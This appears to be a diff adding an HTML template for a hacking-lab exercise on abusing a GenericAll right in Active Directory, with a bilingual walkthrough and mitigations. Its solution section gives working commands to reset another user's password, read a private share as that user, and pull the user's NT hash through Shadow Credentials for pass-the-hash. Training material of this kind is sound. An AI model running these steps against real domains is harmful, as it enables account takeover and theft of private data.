@@ -1,0 +1,121 @@
+{% extends "base.html" %}
+{% block title %}AD 08 – ACL Abuse: GenericAll – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_acl_genericall_obj_desc">svc.readonly tiene GenericAll sobre otro usuario del dominio. Cámbiale la contraseña sin conocer la anterior, autentícate con su identidad y lee //DC01/hr_private.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/hr_private/flag-ad-08.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Resetear la contraseña de m.davis (tenemos GenericAll sobre él)
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} \
+  -u svc.readonly -p 'ReadOnly123!' \
+  set password m.davis 'NewP@ss123!'</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Confirmar el derecho</h3>
+    <p><code>GenericAll</code> (control total) sobre un usuario permite, entre otras cosas, forzar el cambio de su contraseña sin conocer la anterior. BloodHound lo pinta como <strong>GenericAll → User</strong>.</p>
+    <pre>export DC={{ ad_dc_ip }}
+
+# Con bloodyAD: ver quién tiene qué sobre m.davis
+bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+  get object 'Michael Davis' --attr nTSecurityDescriptor
+
+# Con netexec: buscar derechos abusables de svc.readonly
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M daclread \
+  -o TARGET='m.davis' ACTION=read</pre>
+
+    <h3>2 · Resetear la contraseña de la víctima</h3>
+    <pre># bloodyAD (fija una contraseña conocida)
+bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+  set password m.davis 'NewP@ss123!'
+
+# net rpc (misma operación por SAMR)
+net rpc password 'm.davis' 'NewP@ss123!' -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S $DC
+
+# pth-net / impacket-changepasswd también valen
+impacket-changepasswd '{{ ad_realm_lower }}/m.davis'@$DC \
+  -newpass 'NewP@ss123!' -altuser 'svc.readonly' -altpass 'ReadOnly123!' -reset</pre>
+
+    <h3>3 · Autenticarse como la víctima y capturar la flag</h3>
+    <pre>nxc smb $DC -u 'm.davis' -p 'NewP@ss123!' --shares
+
+smbclient //$DC/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>4 · Alternativa sigilosa: Shadow Credentials</h3>
+    <p>Resetear una contraseña es ruidoso (rompe el login del usuario legítimo). Con <code>GenericAll</code> también puedes escribir <code>msDS-KeyCredentialLink</code> y autenticarte por PKINIT sin tocar la contraseña:</p>
+    <pre>certipy-ad shadow auto -u svc.readonly@{{ ad_realm_lower }} -p 'ReadOnly123!' \
+  -account m.davis -dc-ip $DC
+# Devuelve el hash NT de m.davis → úsalo con pass-the-hash</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Revisar y retirar ACEs <code>GenericAll</code>/<code>GenericWrite</code>/<code>WriteOwner</code> concedidos a cuentas no administrativas.</li>
+      <li>Proteger las cuentas sensibles con <em>AdminSDHolder</em> y el flag <em>Protected Users</em>.</li>
+      <li>Alertar sobre resets de contraseña (evento <code>4724</code>) y escrituras de <code>msDS-KeyCredentialLink</code>.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">bloodyAD</span> <span class="tools-badge">net rpc</span> <span class="tools-badge">impacket-changepasswd</span> <span class="tools-badge">certipy-ad</span> <span class="tools-badge">netexec (nxc)</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Confirm the right</h3>
+    <p><code>GenericAll</code> (full control) over a user allows, among other things, forcing a password change without knowing the old one. BloodHound draws it as <strong>GenericAll → User</strong>.</p>
+    <pre>export DC={{ ad_dc_ip }}
+
+# With bloodyAD: see who has what over m.davis
+bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+  get object 'Michael Davis' --attr nTSecurityDescriptor
+
+# With netexec: hunt for svc.readonly's abusable rights
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M daclread \
+  -o TARGET='m.davis' ACTION=read</pre>
+
+    <h3>2 · Reset the victim's password</h3>
+    <pre># bloodyAD (set a known password)
+bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+  set password m.davis 'NewP@ss123!'
+
+# net rpc (same operation over SAMR)
+net rpc password 'm.davis' 'NewP@ss123!' -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S $DC
+
+# pth-net / impacket-changepasswd work too
+impacket-changepasswd '{{ ad_realm_lower }}/m.davis'@$DC \
+  -newpass 'NewP@ss123!' -altuser 'svc.readonly' -altpass 'ReadOnly123!' -reset</pre>
+
+    <h3>3 · Authenticate as the victim and capture the flag</h3>
+    <pre>nxc smb $DC -u 'm.davis' -p 'NewP@ss123!' --shares
+
+smbclient //$DC/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>4 · Stealthier alternative: Shadow Credentials</h3>
+    <p>Resetting a password is noisy (it breaks the legitimate user's logon). With <code>GenericAll</code> you can instead write <code>msDS-KeyCredentialLink</code> and authenticate via PKINIT without touching the password:</p>
+    <pre>certipy-ad shadow auto -u svc.readonly@{{ ad_realm_lower }} -p 'ReadOnly123!' \
+  -account m.davis -dc-ip $DC
+# Returns m.davis's NT hash → use it with pass-the-hash</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Review and remove <code>GenericAll</code>/<code>GenericWrite</code>/<code>WriteOwner</code> ACEs granted to non-admin accounts.</li>
+      <li>Protect sensitive accounts with <em>AdminSDHolder</em> and the <em>Protected Users</em> group.</li>
+      <li>Alert on password resets (event <code>4724</code>) and <code>msDS-KeyCredentialLink</code> writes.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">bloodyAD</span> <span class="tools-badge">net rpc</span> <span class="tools-badge">impacket-changepasswd</span> <span class="tools-badge">certipy-ad</span> <span class="tools-badge">netexec (nxc)</span></div>
+  </div>
+</div>
+{% endblock %}
